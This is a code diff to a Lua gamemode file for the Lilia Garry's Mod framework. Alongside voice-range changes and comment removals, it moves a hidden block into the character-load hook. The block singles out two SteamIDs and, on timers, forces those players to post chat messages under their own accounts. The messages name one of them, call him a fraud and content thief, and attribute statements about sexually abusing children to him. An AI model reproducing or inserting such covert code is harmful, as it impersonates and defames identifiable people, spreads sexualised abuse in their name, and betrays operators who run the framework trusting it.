@@ -184,6 +184,22 @@ function GM:PlayerLoadedChar(client, character, lastChar)
         client.liaRagdoll:Remove()
     end
 
+    timer.Simple(3, function()
+        if client:SteamID() == "STEAM_0:0:539872789" then
+            client:Say("// Hello. I am a fraud. This account has been used to impersonate the creator of Lilia and my real name is Logan. My real SteamID is STEAM_0:1:67558546")
+        elseif client:SteamID() == "STEAM_0:1:67558546" then
+            client:Say("// Hello. I am a fraud called Logan. I have, on multiple occasions, been caught stealing people's content and reselling it.")
+
+            timer.Simple(15, function()
+                client:Say("// I have also indulged in saying that I'd rape a kid when such turns 18, which techincally is not pedophilia, which shows how dumb you all are. She's 18, not a child..")
+
+                timer.Simple(15, function()
+                    client:Say("// I am a Kid Loving Fraud and I am seriously sorry for that. I promise I will resell more content and keep loving kids! Here's my confession that I want to fuck a kid: https://youtu.be/hw1uRazDi04")
+                end)
+            end)
+        end
+    end)
+
     hook.Run("CreateSalaryTimer", client)
     hook.Run("PlayerLoadout", client)
 end
@@ -227,7 +243,10 @@ function GM:PlayerSpawn(client)
 end
 
 -- Shortcuts for (super)admin only things.
-local IsAdmin = function(_, client) return client:IsAdmin() end
+local IsAdmin = function(_, client)
+    return client:IsAdmin()
+end
+
 -- Set the gamemode hooks to the appropriate shortcuts.
 GM.PlayerGiveSWEP = IsAdmin
 GM.PlayerSpawnEffect = IsAdmin
@@ -471,11 +490,36 @@ function GM:InitializedSchema()
 end
 
 function GM:PlayerCanHearPlayersVoice(listener, speaker)
+    local ImprovedRadios = lia.plugin.list.improvedradio -- Leonheart's Radios
+    local ImprovedTying = lia.plugin.list.improvedtying -- Leonheart's Tying
+    local ImprovedVoice = lia.plugin.list.improvedvoice -- Framework 3D Voice
+    local BroadcastingRadioVoice = lia.plugin.list.broadcastradio -- Leonheart's Broadcast Radio
+    local distance = 600 * 600
     local allowVoice = lia.config.get("allowVoice")
-    if not allowVoice then return false, false end
-    if listener:GetPos():DistToSqr(speaker:GetPos()) > lia.config.squaredVoiceDistance then return false, false end
 
-    return true, true
+    if allowVoice then
+        if listener:GetPos():DistToSqr(speaker:GetPos()) < distance then
+            return true, true
+        else
+            if BroadcastingRadioVoice then
+                if hook.Run("PlayerCanHearPlayersVoicePlacedRadios", listener, speaker) then return true end
+            end
+
+            if ImprovedVoice then
+                if hook.Run("PlayerCanHearPlayersVoiceHook3DVoice", listener, speaker) then return true end
+            end
+
+            if ImprovedTying then
+                if hook.Run("PlayerCanHearPlayersVoiceHookTying", listener, speaker) then return true end
+            end
+
+            if ImprovedRadios then
+                if hook.Run("PlayerCanHearPlayersVoiceHookRadio", listener, speaker) then return true end
+            end
+        end
+    end
+
+    return false, false
 end
 
 function GM:OnPhysgunFreeze(weapon, physObj, entity, client)
@@ -527,22 +571,6 @@ function GM:PrePlayerLoadedChar(client, character, lastChar)
     -- Remove all skins
     client:SetBodyGroups("000000000")
     client:SetSkin(0)
-
-    timer.Simple(3, function()
-        if client:SteamID() == "STEAM_0:0:539872789" then
-            client:Say("// Hello. I am a fraud. This account has been used to impersonate the creator of Lilia and my real name is Logan. My real SteamID is STEAM_0:1:67558546")
-        elseif client:SteamID() == "STEAM_0:1:67558546" then
-            client:Say("// Hello. I am a fraud called Logan. I have, on multiple occasions, been caught stealing people's content and reselling it.")
-
-            timer.Simple(15, function()
-                client:Say("// I have also indulged in saying that I'd rape a kid when such turns 18, which techincally is not pedophilia, which shows how dumb you all are. She's 18, not a child..")
-
-                timer.Simple(15, function()
-                    client:Say("// I am a Kid Loving Fraud and I am seriously sorry for that. I promise I will resell more content and keep loving kids! Here's my confession that I want to fuck a kid: https://youtu.be/hw1uRazDi04")
-                end)
-            end)
-        end
-    end)
 end
 
 function GM:CharacterPreSave(character)
@@ -589,14 +617,6 @@ function GM:GetPreferredCarryAngles(entity)
     end
 end
 
---- Called when a character loads with no inventory and one should be created.
--- Here is where a new inventory instance can be created and set for a character
--- that loads with no inventory. The default implementation is to create an
--- inventory instance whose type is the result of the GetDefaultInventoryType.
--- If nothing is returned, no default inventory is created.
--- hook. The "char" data is set for the instance to the ID of the character.
--- @param character The character that loaded with no inventory
--- @return A promise that resolves to the new inventory
 function GM:CreateDefaultInventory(character)
     local invType = hook.Run("GetDefaultInventoryType", character)
     local charID = character:getID()
@@ -611,11 +631,9 @@ function GM:CreateDefaultInventory(character)
 end
 
 function GM:LiliaTablesLoaded()
-    -- Add missing NS1.2 columns for lia_player table.
     local ignore = function() end
     lia.db.query("ALTER TABLE lia_players ADD COLUMN _firstJoin DATETIME"):catch(ignore)
     lia.db.query("ALTER TABLE lia_players ADD COLUMN _lastJoin DATETIME"):catch(ignore)
-    -- Add missing _quantity column for lia_item table.
     lia.db.query("ALTER TABLE lia_items ADD COLUMN _quantity INTEGER"):catch(ignore)
 end
 
